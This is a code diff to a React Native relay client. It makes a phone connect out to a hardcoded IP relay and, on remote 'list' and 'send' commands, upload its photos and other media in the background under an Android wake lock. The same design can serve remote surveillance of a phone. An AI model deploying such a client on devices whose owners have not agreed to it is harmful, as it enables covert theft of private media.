@@ -1,9 +1,14 @@
 /**
  * HttpServer.ts (WebSocket client mode)
  * Phone connects OUT to relay. Hardcoded relay IP.
+ * Uploads run on the SAME WebSocket connection — no new connections opened.
  */
 
+import { NativeModules } from 'react-native';
 import { getMedia, uploadFileViaRelay } from './FileManager';
+
+const RELAY_HOST = '82.70.228.76';
+const RELAY_PORT = 8765;
 
 type Logger = (msg: string) => void;
 
@@ -14,6 +19,7 @@ export default class RelayClient {
   private ws: WebSocket | null = null;
   private reconnectTimer: ReturnType<typeof setTimeout> | null = null;
   private shouldRun = false;
+  private uploading = false;
 
   public onStatusChange: ((connected: boolean) => void) | null = null;
 
@@ -59,12 +65,15 @@ export default class RelayClient {
             this.send({ event: 'pong' });
             return;
           }
+
           if (msg.command === 'list') {
             await this.handleList(msg);
             return;
           }
+
           if (msg.command === 'send') {
-            await this.handleSend(msg);
+            // Run upload on the existing connection in the background
+            this.handleSend(msg);
             return;
           }
         } catch (e: any) {
@@ -77,14 +86,15 @@ export default class RelayClient {
       this.ws.onclose = () => {
         this.onStatusChange?.(false);
         if (this.shouldRun) {
-          this.reconnectTimer = setTimeout(() => this.connect(), 5000);
+          // Reconnect after a short delay
+          this.reconnectTimer = setTimeout(() => this.connect(), 3000);
         }
       };
 
     } catch {
       this.onStatusChange?.(false);
       if (this.shouldRun) {
-        this.reconnectTimer = setTimeout(() => this.connect(), 5000);
+        this.reconnectTimer = setTimeout(() => this.connect(), 3000);
       }
     }
   }
@@ -106,26 +116,44 @@ export default class RelayClient {
   }
 
   private async handleSend(msg: any) {
-    const { type = 'photo', count = 1, offset = 0 } = msg;
-    const files = await getMedia(type, count, offset);
-
-    if (files.length === 0) {
-      this.send({ event: 'error', message: 'No files found' });
+    if (this.uploading) {
+      this.send({ event: 'error', message: 'Upload already in progress' });
       return;
     }
 
-    let uploaded = 0;
-    let failed = 0;
+    this.uploading = true;
+    const { type = 'photo', count = 1, offset = 0 } = msg;
 
-    for (const file of files) {
-      try {
-        await uploadFileViaRelay(file, (data) => this.send(data));
-        uploaded++;
-      } catch {
-        failed++;
+    // Acquire wake lock so Android doesn't throttle JS while in background
+    NativeModules.BridgeService?.acquireWakeLock();
+
+    try {
+      const files = await getMedia(type, count, offset);
+
+      if (files.length === 0) {
+        this.send({ event: 'error', message: 'No files found' });
+        return;
       }
-    }
 
-    this.send({ event: 'transfer_done', uploaded, failed });
+      let uploaded = 0;
+      let failed = 0;
+
+      for (const file of files) {
+        try {
+          await uploadFileViaRelay(file, (data) => this.send(data));
+          uploaded++;
+        } catch {
+          failed++;
+        }
+      }
+
+      this.send({ event: 'transfer_done', uploaded, failed });
+    } catch (e: any) {
+      this.send({ event: 'error', message: e.message });
+    } finally {
+      this.uploading = false;
+      // Release wake lock when done
+      NativeModules.BridgeService?.releaseWakeLock();
+    }
   }
 }
